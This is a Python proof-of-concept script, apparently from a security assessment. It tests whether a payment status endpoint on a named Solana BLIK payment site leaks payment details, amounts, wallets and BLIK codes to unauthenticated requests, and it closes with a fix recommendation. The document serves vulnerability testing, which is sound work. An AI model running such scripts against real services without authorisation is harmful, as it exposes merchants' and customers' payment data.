#!/usr/bin/env python3
"""
AUTHZ-VULN-06: Test for unauthorized access to payment status endpoint
Tests if GET /api/payments/:id/status allows unauthenticated access to payment details
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://solana-blik.vercel.app"

def print_section(title):
    """Print a formatted section header"""
    print("\n" + "=" * 80)
    print(f" {title}")
    print("=" * 80)

def print_request(method, url, headers=None, body=None):
    """Print request details"""
    print(f"\n{method} {url}")
    if headers:
        print("Headers:")
        for key, value in headers.items():
            print(f"  {key}: {value}")
    if body:
        print("Body:")
        print(f"  {json.dumps(body, indent=2)}")

def print_response(response):
    """Print response details"""
    print(f"\nStatus Code: {response.status_code}")
    print(f"Headers:")
    for key, value in response.headers.items():
        print(f"  {key}: {value}")
    print(f"\nResponse Body:")
    try:
        print(json.dumps(response.json(), indent=2))
    except:
        print(response.text)

def test_authz_vuln_06():
    """
    Test AUTHZ-VULN-06: Unauthorized access to payment status

    Step 1: Create a payment as a legitimate merchant
    Step 2: Access the payment status without authentication (as attacker)
    """

    print_section("AUTHZ-VULN-06: Unauthorized Payment Status Access Test")
    print(f"Test Time: {datetime.now().isoformat()}")
    print(f"Target: {BASE_URL}")

    # Step 1: Create a payment
    print_section("STEP 1: Create Payment (Legitimate Merchant)")

    create_url = f"{BASE_URL}/api/payments/create"
    create_payload = {
        "amount": 5.0,
        "merchantWallet": "11111111111111111111111111111111"
    }

    print_request("POST", create_url, body=create_payload)

    try:
        create_response = requests.post(create_url, json=create_payload)
        print_response(create_response)

        if create_response.status_code != 200:
            print("\n[ERROR] Failed to create payment")
            return False

        payment_data = create_response.json()
        payment_id = payment_data.get('paymentId')

        if not payment_id:
            print("\n[ERROR] No paymentId in response")
            return False

        print(f"\n[SUCCESS] Payment created with ID: {payment_id}")

    except Exception as e:
        print(f"\n[ERROR] Exception during payment creation: {e}")
        return False

    # Step 2: Access payment status WITHOUT authentication (EXPLOIT)
    print_section("STEP 2: Access Payment Status WITHOUT Authentication (EXPLOIT)")
    print("Scenario: Attacker (different actor) tries to access payment details")
    print("Expected if vulnerable: 200 status with payment details exposed")

    status_url = f"{BASE_URL}/api/payments/{payment_id}/status"

    # Intentionally NO authentication headers
    print_request("GET", status_url)
    print("\nNote: NO authentication headers provided (simulating attacker)")

    try:
        status_response = requests.get(status_url)
        print_response(status_response)

        # Analyze the response
        print_section("VULNERABILITY ANALYSIS")

        if status_response.status_code == 200:
            print("\n[CRITICAL] Vulnerability CONFIRMED!")
            print("The endpoint returned 200 OK without authentication")

            try:
                status_data = status_response.json()
                print("\nSensitive Information Disclosed:")
                print("-" * 80)

                disclosed_fields = []
                if 'status' in status_data:
                    print(f"  • Payment Status: {status_data['status']}")
                    disclosed_fields.append('status')

                if 'amount' in status_data:
                    print(f"  • Payment Amount: {status_data['amount']}")
                    disclosed_fields.append('amount')

                if 'code' in status_data:
                    print(f"  • BLIK Code: {status_data['code']}")
                    disclosed_fields.append('code')

                if 'reference' in status_data:
                    print(f"  • Reference: {status_data['reference']}")
                    disclosed_fields.append('reference')

                if 'merchantWallet' in status_data:
                    print(f"  • Merchant Wallet: {status_data['merchantWallet']}")
                    disclosed_fields.append('merchantWallet')

                if 'customerWallet' in status_data:
                    print(f"  • Customer Wallet: {status_data['customerWallet']}")
                    disclosed_fields.append('customerWallet')

                if 'createdAt' in status_data:
                    print(f"  • Created At: {status_data['createdAt']}")
                    disclosed_fields.append('createdAt')

                print("\n" + "-" * 80)
                print(f"Total disclosed fields: {len(disclosed_fields)}")
                print(f"Fields: {', '.join(disclosed_fields)}")

                print("\n[IMPACT] Information Disclosure Vulnerability")
                print("• Any unauthenticated user can access payment details")
                print("• Only requires knowledge of the payment UUID")
                print("• Exposes merchant business information (amounts, status)")
                print("• Could expose BLIK codes if still active")
                print("• Violates payment confidentiality")

                return True

            except Exception as e:
                print(f"\n[ERROR] Could not parse response: {e}")
                return False

        elif status_response.status_code == 401:
            print("\n[PASS] Vulnerability NOT present")
            print("Endpoint correctly requires authentication (401 Unauthorized)")
            return False

        elif status_response.status_code == 403:
            print("\n[PASS] Vulnerability NOT present")
            print("Endpoint correctly denies access (403 Forbidden)")
            return False

        else:
            print(f"\n[INFO] Unexpected status code: {status_response.status_code}")
            return False

    except Exception as e:
        print(f"\n[ERROR] Exception during status check: {e}")
        return False

if __name__ == "__main__":
    try:
        vulnerable = test_authz_vuln_06()

        print_section("TEST SUMMARY")
        print(f"Test: AUTHZ-VULN-06")
        print(f"Vulnerability: Unauthorized Payment Status Access")
        print(f"Result: {'VULNERABLE' if vulnerable else 'NOT VULNERABLE'}")

        if vulnerable:
            print("\n[RECOMMENDATION]")
            print("Add authentication and authorization checks to /api/payments/:id/status")
            print("Verify the requester has permission to view the specific payment")

    except KeyboardInterrupt:
        print("\n\n[INFO] Test interrupted by user")
    except Exception as e:
        print(f"\n\n[ERROR] Test failed with exception: {e}")
